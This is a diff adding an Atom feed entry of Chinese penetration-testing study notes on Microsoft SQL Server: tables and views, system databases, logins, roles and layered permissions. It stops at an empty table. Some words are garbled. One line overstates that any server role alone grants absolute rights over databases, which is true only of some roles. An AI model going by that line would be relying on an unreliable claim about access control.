+<h3>表与视图之间的联系？</h3>
+<p><span data-type="text" style="color: var(--b3-font-color9);">视图是建立在表的基础之上的</span>一种结构视图中的数据可以来源于多张表;</p>
+<p>表是实际存在的不依附视图;</p>
+<p>使用视图可以增强表的安全性;</p>
+<p>数据表是真实存在的，有效数据，视图相当于固定的5q语句，当打开视图就行其$q语句。视图多为几个表的关系联合表达。有助于封装复杂的关系。</p>
+<h3>MSSql的默认库</h3>
+<p>SQL Servers安装4个系统数据库。它们分别是master数据库、model数据库、tempdb数据库和msdb数据库。这些数据库是<br>
+SQL Server的心脏和灵魂。</p>
+<ul>
+<li><span data-type="text" style="color: var(--b3-font-color8);">master</span>数据库（重要）：master数据库控制SQL Server的所有方面。这个数据库中包括所有的<span data-type="text" style="color: var(--b3-font-color8);">配置信息、用户登录信息</span>、当<br>
+前正在服务器中运行的<span data-type="text" style="color: var(--b3-font-color8);">过程的信息</span>。</li>
+<li><span data-type="text" style="color: var(--b3-font-color8);">model</span>数据库：model数据库是建立所有用户数据库时的模板。当建立一个新数据库时，SQL Servers会把model数据库中的所<br>
+有对象建立一份拷贝并移到新数据库中。在模板对象被拷贝到新的用户数据库中之后，该数据库的所有多余空间都将被空页填<br>
+满。</li>
+<li><span data-type="text" style="color: var(--b3-font-color8);">tempdb</span>数据库：这个库用来<span data-type="text" style="color: var(--b3-font-color8);">保存所有的临时表</span>、存储过程和其他SQL Server建立的临时用的东西。</li>
+<li><span data-type="text" style="color: var(--b3-font-color8);">msdb</span>数据库：由Enterprise Manager和Agent使用，记录着任务计划信息、事件处理信息、数据备份及恢复信息、警告及异<br>
+常信息。</li>
+</ul>
+<h2>MSSql中角色和用户</h2>
+<h3>服务器角度</h3>
+<ul>
+<li>服务器登录名：指有权限登录到某服务器的<span data-type="text" style="color: var(--b3-font-color8);">用户</span>，可以在有权限的情况下创建新的登录名，超级管理员的登录名是<span data-type="text" style="color: var(--b3-font-color8);">sa</span></li>
+<li>服务器角色：指一组固定的服务器用户，默认有<span data-type="text" style="color: var(--b3-font-color8);">9组</span>。针对行整个数据库服务器设定的角色和权限。</li>
+<li>服务器登录名和角色的关系：登录名一定属于某些角色，默认为<span data-type="text" style="color: var(--b3-font-color8);">public</span>。服务器角色不允许更改，登陆后也不一定有权限操作数据库。</li>
+</ul>
+<h3>数据库角度</h3>
+<ul>
+<li>数据库用户：指有权限能操作数据库的用户。</li>
+<li>数据库角色：指一组固定的<span data-type="text" style="color: var(--b3-font-color8);">有某些权限</span>的数据库角色，针对某个特定数据库设定的角色和权限。</li>
+<li>数据库架构：指数据库对象的容器。</li>
+<li>用户、角色、机构的关系：数据库用户对应于服务器登录名以便登录者可以操作数据库。数据库角色可以添加，可以定制不同权限数据库架构，类似于数据库对像的命名空间，用户通过架构访问数据库对象。</li>
+</ul>
+<p>在sqlserver里一个用户最终的权限应该是由<span data-type="text" style="color: var(--b3-font-color8);">服务器权限</span>加上<span data-type="text" style="color: var(--b3-font-color8);">数据库权限</span>加上<span data-type="text" style="color: var(--b3-font-color8);">对像的权限</span>组成的，这三个级别的权限是累加的。<br>
+但是拒绝权限是优先的<br>
+如果一个用户指定了服务器角色，那这个用户对服务器某些操作就有了一定权限，比如说执行系统命令、管理服务器磁盘、开机关机等等，如果不指定具体角色，默认为public角色<br>
+如果一个用户指定了数据库角色，那这个用户在ssql数据库中的某个或某几个数据库就有了管理权限，例如有最高管理权限、只可读权限、只可写权限等。<br>
+注意：如果某个账号只指定的服务器角色，没有指定数据库角色，该账号还是对数据库有绝对操作的权利。</p>
+<h2>MSSql权限控制</h2>
+<h3>固定服务器角色</h3>
+<p>|固定服务器角色|说明|<br>
+|</p>
+]]></content>
+    <category term="渗透测试"/>
+    <published>2023-09-06T00:00:00.000Z</published>
   </entry>
 </feed>
